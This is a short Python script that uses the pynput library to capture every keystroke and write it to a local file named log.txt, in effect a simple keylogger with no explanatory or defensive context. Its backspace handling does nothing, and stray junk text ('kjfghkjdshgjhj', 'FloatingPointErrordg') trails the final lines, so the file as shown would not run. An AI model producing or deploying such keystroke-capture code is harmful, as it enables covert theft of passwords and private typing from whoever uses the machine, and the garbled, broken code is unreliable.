import pynput
from pynput.keyboard import Key,Listener
k=[]
def press(key):
  global k
  k.append(key)
  print("{0}".format(key))
  write(k)
def release(key):
  if key==Key.esc :
    return False
def write(k):
  with open("log.txt","w") as f:
    for key in k:
      k=str(key).replace("'","")
      if k.find("enter")>0 :
        f.write("\n")
      elif k.find("Key")==-1 :
        f.write(k)
      elif k.find("space")>0:
        f.write(" ")
      elif k.find("shift")>0:
        f.write("")
      elif k.find("backspace")>0:
        k.replace("character_to_remove","")
      else:
        f.write(str(key))

with Listener(on_press=press,on_release=release) as Listener:
  Listener.join()kjfghkjdshgjhj
  FloatingPointErrordg
  defdgh
  dgh
  